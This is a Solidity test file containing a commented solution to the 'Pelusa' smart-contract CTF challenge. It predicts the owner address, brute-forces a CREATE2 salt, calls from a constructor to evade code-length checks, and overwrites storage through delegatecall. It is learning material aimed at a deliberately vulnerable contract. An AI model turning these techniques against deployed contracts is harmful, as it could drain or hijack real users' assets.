// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./utils/EkoBaseTest.sol";

import "src/Eko/ChallengePelusa.sol";
import "src/Eko/ChallengePelusa.factory.sol";

contract PelusaTest is EkoBaseTest {
    Pelusa challenge;

    function preSetupHook() internal override {
        super.preSetupHook();

        /* IMPLEMENT YOUR PRE SETUP */

        // Init the challenge
        factory = new ChallengePelusaFactory();
        challenges = factory.deploy(player); // does not matter here, it won't user the player address
        challenge = Pelusa(challenges[0]);
    }

    function runExploit() internal override {
        // Calculate the address that will be generated by the `Pelosa` constructor during deployment
        // normally you would be able to achieve the same thing by looking at any blockchain explored like Etherscan
        // and reading the blockchain state and deployment parameters that are used by the `Pelosa` constructor
        // to generate the same address stored in `Pelosa` `owner`
        address challengeOwner =
            address(uint160(uint256(keccak256(abi.encodePacked(address(factory), blockhash(block.number))))));

        // In order to pass the `passTheBall` second requirement we need to generate a smart contract whom address
        // will pass the check `uint256(uint160(msg.sender)) % 100 == 10`
        // In order to do that we can leverage the `create2` opcode that allow us to deploy smart contract
        // at deterministic addresses (given a bytecode hash and a salt)
        uint256 finalSalt = type(uint256).max;

        // generate the bytecode used to deploy our contract with the specific `constructor` input parameter
        bytes memory bytecode =
            abi.encodePacked(type(MaradonaContract).creationCode, abi.encode(challenge, challengeOwner));
        // try to brute force a salt that will allow use to create a contracts
        // whom address will pass the `passTheBall` check
        for (uint256 salt = 0; salt < 1000; salt++) {
            // generate the `bytecodeHash` used to know in a deterministic way the final address of the deployed contract
            bytes32 bytecodeHash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)));

            // cast the bytecode hash to get the final contract address
            address computedAddress = address(uint160(uint256(bytecodeHash)));

            // check that the contract address will pass the `passTheBall` check
            if (uint256(uint160(computedAddress)) % 100 == 10) {
                // store the salt in a local variable to be later used to deploy the address
                finalSalt = salt;

                // we can exit the loop
                break;
            }
        }

        // check that we have found a salt that match our requirements
        require(finalSalt != type(uint256).max, "no valid salt found to satisfy passTheBall()");

        // deploy the contract via the lowlevel `create2` opcode using the `finalSalt`
        address maradonaContractAddress;
        assembly {
            maradonaContractAddress := create2(callvalue(), add(bytecode, 0x20), mload(bytecode), finalSalt)
            if iszero(extcodesize(maradonaContractAddress)) { revert(0, 0) }
        }

        challenge.shoot();
    }
}

contract MaradonaContract {
    // map the `MaradonaContract` layout storage in the same way of `Pelosa`
    // in order to be able to modify the caller (`Pelosa`) layout storage
    // during the execution of the `handOfGod` function in a delegatecall context
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor(Pelusa challenge, address challengeOwner) {
        owner = challengeOwner;

        // execute `Pelosa.passTheBall()` during our constructor code
        // in order to be able to pass the check `msg.sender.code.length == 0`
        // during constructor time, our smart contract is not fully deployed yet
        // and our runtime code is still empty
        // it will be initialized only after that the constructor has been executed
        challenge.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        // just return the same owner that is stored by the `Pelusa` contract to pass the check in `isGoal`
        return owner;
    }

    function handOfGod() external returns (bytes32) {
        // this functon is executed via `delegatecall`
        // that will execute this contract's logic but within the caller's context
        // if we map this contract's layout storage equal to the one of the caller
        // we will be able to "overwrite" the caller's layout storage in the specific point
        // we need to in order to be able to solve the challenge
        goals = 2;

        // to pass the `Pelosa` check from the `shoot` function we need to return
        // the "inverse" cast of what it does expect
        return bytes32(uint256(22_06_1986));
    }
}
